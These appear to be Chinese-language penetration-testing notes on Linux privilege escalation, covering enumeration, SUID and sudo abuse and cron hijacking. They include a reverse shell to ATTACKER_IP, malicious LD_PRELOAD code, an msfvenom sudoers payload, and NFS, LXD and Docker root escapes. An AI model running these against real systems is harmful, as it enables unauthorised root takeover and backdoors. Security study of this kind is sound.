
#### 目录
- [初始信息收集](#初始信息收集-initial-information-gathering)
- [自动化枚举工具](#自动化枚举工具-automated-enumeration-tools)
- [提权方法](#提权方法-escalation-techniques)

#### 概述 (Overview)

获取 Linux 系统的低权限 Shell 后，目标是提升至 root 用户权限，以获得对系统的完全控制。正如在渗透测试中，获得初始 Shell 并非结束，后渗透阶段的信息收集与利用与前期同样重要。Linux 提权方法多样，涉及内核漏洞、配置错误、SUID/SGID 程序利用、计划任务劫持、密码复用、环境变量劫持、错误配置的网络共享等。

#### 初始信息收集 (Initial Information Gathering)

一旦获得了 Shell，枚举系统信息便是最重要的一步。这有助于了解系统环境、寻找配置弱点和潜在的提权向量。

*   **系统标识与版本**:
    *   `hostname`: 获取目标机器的名称。虽然可以修改，但有时能揭示其在网络中的角色。
    *   `uname -a`: 内核版本、架构等。
    *   `uname -r`: 仅显示内核版本。
    *   `uname -e`: (补充笔记) 打印系统信息，提供关于内核的额外细节，对搜索内核漏洞有用。
    *   `cat /proc/version`: (补充笔记) 内核详细信息，可能包含编译器信息等。
    *   `cat /etc/issue` 或 `cat /etc/*-release`: 发行版名称和版本。(补充笔记) `issue` 文件内容可自定义，但仍值得查看。
    *   `lsb_release -a`: (如果安装了 lsb-core)。
    *   **内核版本号解读**: 主版本.次版本.修订版本 (如 `3.10.0`)。次版本为偶数表示稳定版，奇数表示开发版。

*   **进程信息**:
    *   `ps`: 查看当前 Shell 的进程。输出列：PID (进程ID), TTY (终端类型), Time (CPU时间), CMD (命令)。
    *   `ps -A` 或 `ps aux`: 查看所有运行的进程。`aux` 显示所有用户进程(a)、启动用户(u)、无终端进程(x)。
    *   `ps axjf`: 查看进程树，了解进程间的父子关系。

*   **用户信息与权限**:
    *   `id`: 提供当前用户的 UID, GID 及所属组，了解权限级别和组成员身份。
    *   `whoami`: 显示当前用户名。
    *   `cat /etc/passwd`: 读取此文件可发现系统上的用户列表。注意检查其权限。
    *   `cat /etc/shadow`: 尝试读取此文件（通常需要更高权限）。若可读，包含用户密码哈希，可用于离线破解。
    *   `sudo -l`: 列出当前用户被允许使用 `sudo` 执行的命令。这是检查 Sudo 提权向量的关键步骤。
    *   `history`: 查看命令历史记录，可能发现敏感信息如密码、用户名或管理员的操作习惯。

*   **环境与配置**:
    *   `env`: 显示环境变量。特别关注 `PATH` 变量，它可能包含可写目录（用于 PATH 提权）或指向编译器/脚本解释器的路径。
    *   `pwd`: 显示当前工作目录。
    *   `ls -lha <directory>`: 查看文件和目录的详细权限。

*   **网络信息**:
    *   `ifconfig` 或 `ip a`: 获取网络接口配置信息（IP 地址、子网掩码等）。
    *   `ip route` 或 `route -n`: 查看网络路由表，了解网络连接情况。
    *   `netstat`: 调查网络连接和监听端口。常用参数：
        *   `-a`: 显示所有监听端口和已建立连接。
        *   `-at` / `-au`: 仅列出 TCP / UDP 连接。
        *   `-l`: 仅列出监听状态的端口 (开放的服务)。
        *   `-tp`: 列出 TCP 连接及对应的服务名和 PID。
        *   `-i`: 显示网络接口统计信息。
        *   `-n`: 不解析主机名，直接显示 IP 地址和端口号。
        *   `-o`: 显示计时器信息。
        *   `-s`: 按协议显示网络统计信息。
        *   **推荐组合**: `netstat -antp` (TCP), `netstat -anup` (UDP)。

*   **文件系统搜索 (`find`)**: 
    *   `find` 命令对于在目标系统中搜集重要信息和定位潜在提权向量非常有效。常用参数：
        *   按名称: `find / -name <filename> 2>/dev/null` (从根目录查找)
        *   按类型: `find / -type d -name <dirname> 2>/dev/null` (查找目录), `find / -type f ...` (查找文件)
        *   按权限:
            *   `find / -perm 0777 -type f 2>/dev/null` (查找权限为 777 的文件)
            *   `find / -perm a=x 2>/dev/null` (查找所有用户可执行的文件)
            *   **查找 SUID/SGID**:
                *   `find / -user root -perm -4000 -print 2>/dev/null` (查找 root 拥有的 SUID 文件)
                *   `find / -group root -perm -2000 -print 2>/dev/null` (查找 root 组拥有的 SGID 文件)
                *   `find / -perm -u=s -type f 2>/dev/null` (查找所有 SUID 文件，推荐)
                *   `find / -perm -g=s -type f 2>/dev/null` (查找所有 SGID 文件)
        *   按所有者/组: `find /home -user frank 2>/dev/null`
        *   按时间:
            *   `-mtime N`: N 天前修改的文件。
            *   `-atime N`: N 天前访问的文件。
            *   `-cmin -N`: N 分钟内更改的文件。
            *   `-amin -N`: N 分钟内访问的文件。
        *   按大小: `find / -size +50M 2>/dev/null` (查找大于 50MB 的文件)
        *   **查找可写文件/目录**: (重要提权向量)
            *   `find / -writable -type d 2>/dev/null` (查找当前用户可写的目录)
            *   `find / -perm -222 -type d 2>/dev/null` (查找全局可写的目录)
            *   `find / -perm -o w -type d 2>/dev/null` (查找其他用户(other)有写权限的目录)
        *   **查找开发工具/语言**: (用于编译 Exploit 或执行脚本)
            *   `find / -name perl* 2>/dev/null`
            *   `find / -name python* 2>/dev/null`
            *   `find / -name gcc* 2>/dev/null`
            *   `find / -name nc*` 或 `find / -name netcat*`
    *   **提示**: `find` 命令常产生权限错误，使用 `2>/dev/null` 将错误重定向，使输出更清晰。

#### 自动化枚举工具 (Automated Enumeration Tools)

为节省时间，可使用自动化脚本进行信息收集和提权检查。目标环境可能影响工具选择。

*   **LinEnum.sh**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) - 详细的枚举脚本。
*   **LinPeas.sh/winPEAS.bat**: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) - 流行且全面的枚举工具。
*   **LES (Linux Exploit Suggester)**: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) - 根据内核版本建议漏洞利用。
*   **Linux Smart Enumeration**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) - 另一个智能枚举脚本。
*   **linuxprivchecker.py**: [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py) - Python 脚本，检查常见向量。
*   **unix-privesc-check**: [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check) - Shell 脚本，执行一系列检查。

#### 提权方法 (Escalation Techniques)

1.  **利用内核漏洞 (Kernel Exploit)**
    *   **原理**: 利用 Linux 内核未修复的漏洞执行代码获取 root 权限。
    *   **步骤**:
        1.  **识别内核版本**: `uname -r` 或 `cat /proc/version`。
        2.  **搜索 Exploit**: 根据内核版本和发行版信息，在 Exploit-DB, GitHub, Google 搜索对应的本地提权 (LPE) Exploit。使用 LES 等工具可辅助查找。
        3.  **获取与编译**: 下载 Exploit 源码（通常是 C 文件）。在目标机或具有相同环境的机器上使用 `gcc` 编译。示例：`gcc exploit.c -o exploit_bin -lpthread` (可能需要 `-pthread` 或其他库)。
        4.  **上传与执行**: 将编译好的二进制文件上传到目标机可写且可执行的目录（如 `/tmp`），赋予执行权限 (`chmod +x exploit_bin`)，然后运行 (`./exploit_bin`)。
    *   **脏牛漏洞 (Dirty COW - CVE-2016-5195)**:
        *   **影响范围**: Linux 内核 >= 2.6.22 至 2016 年 10 月修复前。
        *   **原理**: 利用写时复制 (Copy-on-Write) 的竞争条件，允许低权限用户修改只读内存映射。
        *   **示例 Exploit**: [gbonacini/CVE-2016-5195](https://github.com/gbonacini/CVE-2016-5195) (创建新 root 用户)。编译执行后按提示操作，成功后用新用户/密码登录或 `su`，**务必恢复 `/etc/passwd` 备份**。
    *   **风险**: 内核 Exploit 可能导致系统崩溃、不稳定或被检测到。需谨慎使用。

2.  **利用 SUID/SGID 程序 (SUID/SGID Exploitation)**
    *   **原理**: SUID 程序以文件所有者（通常是 root）权限运行，SGID 以文件所属组权限运行。若这些程序存在可利用点（如执行命令、读写文件），则可提权。
    *   **查找**: 使用前面 `find` 命令部分提到的指令查找 SUID/SGID 文件。
    *   **利用**:
        *   **检查 GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/) - 查询找到的 SUID/SGID 程序是否有已知的提权方法。
        *   **常见可利用程序**:
            *   `nmap` (旧版本, --interactive)
            *   `find` (`-exec` 参数: `find . -exec /bin/sh -p \; -quit`)
            *   `vim`/`vi` (`:!/bin/sh` 或 `:shell`)
            *   `bash`/`sh` (若有 SUID: `bash -p`)
            *   `cp`, `mv` (覆盖/移动敏感文件)
            *   `more`/`less` (`!/bin/sh`)
            *   `nano` (编辑敏感文件，如 `/etc/passwd` 或 `/etc/shadow` - 见补充笔记)
            *   脚本解释器 (`python`, `perl`, `ruby` 等，若有 SUID)
            *   `systemctl` (特定条件下链接和启用 service)
            *   `base64` (补充笔记: 若有 SUID，可用于读取任意文件，如 `base64 /etc/shadow | base64 --decode`)
            *   ... 更多见 GTFOBins
    *   **示例 (利用 `nano` SUID)**:
        1.  确认 `nano` 有 SUID root 权限。
        2.  `nano /etc/shadow` 和 `nano /etc/passwd`，复制内容到本地。
        3.  本地使用 `unshadow passwd.txt shadow.txt > hashes.txt`。
        4.  使用 `john hashes.txt --wordlist=<wordlist>` 破解密码。
        5.  **或**: 使用 `openssl passwd -1 -salt <salt> <password>` 生成新 root 用户密码哈希。
        6.  `nano /etc/passwd`，在末尾添加新 root 用户行 `newroot:<hash>:0:0:root:/root:/bin/bash`。
        7.  保存后，`su newroot`。

3.  **利用错误的配置文件权限 (Misconfigured Permissions)**
    *   **/etc/passwd 可写**:
        *   **原理**: 直接添加 UID 为 0 的用户。
        *   **步骤**: 检查权限 -> 生成密码哈希 -> 构造用户行 -> 追加到 `/etc/passwd` -> `su newroot`。
    *   **/etc/shadow 可读**:
        *   **原理**: 获取哈希进行离线破解。
        *   **步骤**: `cat /etc/shadow` -> 复制哈希 -> 使用 John the Ripper 或 Hashcat 破解。
    *   **/etc/sudoers 可写**:
        *   **原理**: 直接给自己添加 `sudo ALL=(ALL:ALL) ALL` 权限。使用 `visudo` 编辑是安全的，但如果文件本身可写，可直接修改（危险！可能破坏 sudo 功能）。
    *   **其他敏感文件/目录可写**: 服务配置文件、用户家目录下的脚本、web 服务器目录等。结合 Cron Job 或 PATH 提权。使用 `find / -writable ...` 命令查找。

4.  **利用计划任务 (Cron Jobs)**
    *   **原理**: 系统 (`/etc/crontab`, `/etc/cron.d/*` 等) 或用户 (`crontab -l`) 的 Cron Job 可能以 root 权限执行脚本。如果该脚本或其所在目录对当前用户可写，可修改脚本插入恶意命令（如反弹 Shell）。即使脚本被删除但 Cron 条目仍在 (孤儿任务)，也可创建同名文件来劫持。
    *   **检查**:
        *   `crontab -l`
        *   `ls -l /etc/cron*`
        *   `cat /etc/crontab`
        *   检查列出的脚本及其目录的权限 (`ls -l <script_path>`, `ls -ld <script_dir>`)。
    *   **利用**: 修改脚本，添加 `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'` 等。等待任务执行。
    * **软链接提权:** 在某些情况下，你可能无法修改一个由 root 用户拥有的计划任务脚本，但你对该脚本所在的目录拥有写入权限。这时，可以利用软链接 (Symbolic Link) 来劫持执行流程。
	1. **创建恶意脚本**: 在可写目录下创建一个你自己的脚本 (`script.sh`)，内容为你希望 root 用户执行的命令（例如，复制 `/bin/bash` 并为其添加 SUID 权限）。
	    ```
	    echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > script.sh
	    chmod +x script.sh
	    ```
	2. **创建软链接**: 假设原始的计划任务脚本名为 `backup.sh`，我们先将其删除或重命名，然后创建一个同名的软链接，使其指向我们自己的恶意脚本。
	    ```
	    # mv backup.sh backup.sh.bak  (如果需要备份)
	    # rm backup.sh
	    ln -sf script.sh backup.sh
	    ```
	3. **等待执行**: 当 cron 任务下一次执行 `backup.sh` 时，它实际上会执行 `script.sh`。执行成功后，你就可以通过运行 `/tmp/rootbash -p` 来获得 root shell。

5.  **密码复用与弱密码 (Password Reuse & Weak Passwords)**
    *   **原理**: 在系统配置、数据库连接字符串、脚本中找到的密码，或通过破解 `/etc/shadow` 得到的密码，可能也是 root 或其他高权限用户的密码。尝试 `su root` 或 SSH 登录。

6.  **利用 Sudo 配置错误 (Sudo Misconfiguration)**
    *   **原理**: `sudo -l` 显示用户可以 `sudo` 执行的命令。
    *   **利用**:
        *   **允许的命令可提权**: 如果 `sudo -l` 显示可以运行 `find`, `vim`, `nmap`, `pip`, `docker` 等，查阅 GTFOBins 获取相应的 sudo 提权命令。示例：`sudo find . -exec /bin/sh \; -quit`。
        *   **`NOPASSWD`**: 命令无需密码即可 `sudo` 执行。
        *   **`LD_PRELOAD` / `LD_LIBRARY_PATH` 环境变量劫持**:
            1.  检查 `sudo -l` 输出中是否有 `env_keep+=LD_PRELOAD` 或 `env_keep+=LD_LIBRARY_PATH`。
            2.  编写恶意共享库 (`.so`) 文件，其 `_init` 函数执行提权操作（如 `setuid(0)`, `system("/bin/bash")`）。
                ```c
                #include <stdio.h>
                #include <sys/types.h>
                #include <stdlib.h>

                void _init() {
                    unsetenv("LD_PRELOAD"); // 清除环境变量防止无限循环
                    setgid(0);
                    setuid(0);
                    system("/bin/bash -p"); // -p 保持权限
                }
                ```
            3.  编译: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
            4.  执行: `sudo LD_PRELOAD=/path/to/shell.so <command_allowed_by_sudo>`。
            *   **注意**: 此方法通常在实际用户 ID (RUID) 和有效用户 ID (EUID) 不同时（即 `sudo` 提升权限时）`LD_PRELOAD` 会被安全策略忽略，除非 `sudoers` 中明确允许保留该环境变量。
        * **`LD_PRELOAD` / `LD_LIBRARY_PATH` 环境变量劫持 (具体利用)**: 如果 `sudo -l` 的输出中包含 `env_keep+=LD_PRELOAD`，我们可以利用 `msfvenom` 创建一个恶意的共享对象 (`.so`) 文件，并在运行允许的 `sudo` 命令时预加载它。
		1. **生成恶意 `.so` 文件**: 使用 `msfvenom` 创建一个 payload，例如，在 `/etc/sudoers.d/` 目录下为我们的用户添加免密 `sudo` 权限。
		    ```
		    msfvenom -p linux/x64/exec CMD="echo 'saad ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/saad" AppendExit='true' -f elf-so -o pwn.so
		    ```
		2. **上传并执行**: 将 `pwn.so` 上传到目标机器（例如 `/tmp` 目录），然后执行以下命令。
		    ```
		    sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/ping
		    ```
		    当 `ping` 命令（或任何其他允许的命令）执行时，我们的恶意 `.so` 文件会首先被加载并以 root 权限执行，从而将我们的用户添加到 sudoers 文件中。

7.  **利用 Capabilities**
    *   **原理**: Linux Capabilities 将 root 用户的权限细分，可以赋予普通程序部分 root 权限，而无需 SUID。如果程序拥有危险的 Capability (如 `cap_setuid+ep`)，可能被用来提权。
    *   **查找**: `getcap -r / 2>/dev/null` (递归查找，忽略错误)。
    *   **利用**:
        *   检查 GTFOBins 上具有 Capabilities 提权方法的程序。
        *   **示例 (vim with `cap_setuid+ep`)**:
            ```bash
            # 假设 getcap 显示 vim 有 cap_setuid+ep
            ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
            # 或者，如果 Python 不可用但 Lua 可用:
            # ./vim -c ':lua os.setuid(0); os.execute("/bin/bash -p")'
            ```

8.  **利用 PATH 环境变量劫持**
    *   **原理**: 如果一个高权限进程（如 SUID 程序或 root 运行的 Cron Job）执行一个命令时没有指定绝对路径，系统会在 `PATH` 环境变量指定的目录中查找该命令。如果 `PATH` 中某个目录对当前用户可写，并且该目录在标准命令目录（如 `/bin`, `/usr/bin`）之前，就可以在该可写目录中创建一个同名的恶意脚本/程序，从而劫持执行流程。
    *   **条件**:
        1.  `PATH` 中存在用户可写的目录。 (`find / -writable -type d 2>/dev/null`)
        2.  该可写目录在 `PATH` 中的顺序优先于包含目标命令的目录。
        3.  有一个高权限进程会以相对路径执行该命令。
        4.  (可选) 用户可以修改 `PATH` 环境变量 (`export PATH=/tmp:$PATH`)。
    *   **利用**:
        1.  识别目标命令和可写目录。
        2.  在可写目录中创建恶意脚本，命名为目标命令 (如 `/tmp/service`)，内容通常是反弹 Shell 或执行 `/bin/bash -p`。赋予执行权限 (`chmod +x /tmp/service`)。
        3.  如果需要，修改 `PATH` 使可写目录优先 (`export PATH=/tmp:$PATH`)。
        4.  触发高权限进程执行该命令。

9.  **利用 NFS 配置错误 (no_root_squash)**
    *   **原理**: NFS (Network File System) 共享允许远程挂载。默认情况下，root 用户在访问 NFS 共享时会被映射为 `nfsnobody` 用户 (root_squash)。如果 NFS 共享配置了 `no_root_squash` 选项，那么 root 用户在客户端访问该共享时将保持其 root 权限。攻击者可以在自己的机器上以 root 身份挂载此共享，在共享目录中创建一个 SUID root 的后门程序，然后在目标机器上（作为普通用户）执行该程序即可提权。
    *   **步骤**:
        1.  **枚举 NFS 共享**: 在目标机或攻击机（如果可达）上使用 `showmount -e <target_ip>`。
        2.  **检查 `/etc/exports`**: 在目标机上查看 `/etc/exports` 文件内容，寻找配置了 `(rw,no_root_squash)` 的共享。
        3.  **挂载共享 (在攻击机)**:
            *   `mkdir /mnt/nfs_share`
            *   `sudo mount -t nfs <target_ip>:<shared_dir> /mnt/nfs_share -o rw` (需要攻击机有 mount.nfs)
        4.  **创建 SUID 后门 (在攻击机挂载点)**:
            *   `cd /mnt/nfs_share`
            *   编写 C 代码 (e.g., `nfs_shell.c`) 执行 `setuid(0); system("/bin/bash -p");`。
            *   `sudo gcc nfs_shell.c -o nfs_shell`
            *   `sudo chmod +s nfs_shell` (设置 SUID 位，因为是在攻击机上以 root 身份操作挂载点)
        5.  **执行后门 (在目标机)**:
            *   切换回目标机的低权限 Shell。
            *   `cd <path_to_shared_dir_on_target>`
            *   `./nfs_shell` (此时会以 root 权限执行)
        6.  **清理**: 提权后记得卸载 NFS 共享 (`sudo umount /mnt/nfs_share`)。

10.  **利用 LXD 组 (LXD Group Exploitation)**
	*   **原理**:LXD 是一个系统容器管理器。如果当前用户属于 `lxd` 组，他们就拥有控制 LXD 的权限，可以通过创建一个特权容器来挂载主机的根文件系统，从而获得对整个系统的 root 访问权限。
	*   **步骤**:
	1. **获取/构建 Alpine 镜像**: 在你的攻击机上，克隆 lxd-alpine-builder 仓库并构建一个轻量级的 Alpine Linux 镜像。
	    ```
	    git clone https://github.com/saghul/lxd-alpine-builder.git
	    cd lxd-alpine-builder
	    ./build-alpine
	    ```
	2. **传输并导入镜像**: 将生成的 `.tar.gz` 镜像文件传输到目标机器，然后使用 `lxc` 命令将其导入。
	    ```
	    # 在目标机器上
	    lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
	    ```
	3. **初始化特权容器**: 使用导入的镜像创建一个新的**特权**容器。
	    ```
	    lxc init alpine attacker -c security.privileged=true
	    ```
	4. **挂载主机文件系统**: 将主机的根目录 (`/`) 作为一个磁盘设备挂载到新创建的容器中。
	    ```
	    lxc config device add attacker mydevice disk source=/ path=/mnt/root recursive=true
	    ```
	5. **进入容器并提权**: 启动容器，并在其中执行一个 shell。
	    ```
	    lxc start attacker
	    lxc exec attacker /bin/sh
	    ```
	    
	    进入容器后，主机的整个文件系统都位于 `/mnt/root` 目录下，你可以对其进行任意读写操作，等同于获得了主机的 root 权限。

10. **利用 Docker 组 (Docker Group Exploitation)**
	* **原理**: 如果当前用户属于 `docker` 组，他们就可以与 Docker 守护进程通信。这同样可以被用来提权，通过运行一个特权容器并挂载主机的文件系统。
	* **提权命令**
		```
		docker run --rm -it --privileged --net=host -v /:/mnt alpine chroot /mnt
		```
	* **参数分解**
		- `--privileged`: 授予容器几乎完整的 root 权限，移除所有安全隔离。
		- `--net=host`: 容器共享主机的网络命名空间。
		- `-v /:/mnt`: 将主机的根文件系统 (`/`) 挂载到容器的 `/mnt` 目录。
		- `chroot /mnt`: 将容器的根目录切换到挂载的主机文件系统。执行此命令后，你将直接获得一个主机的 root shell。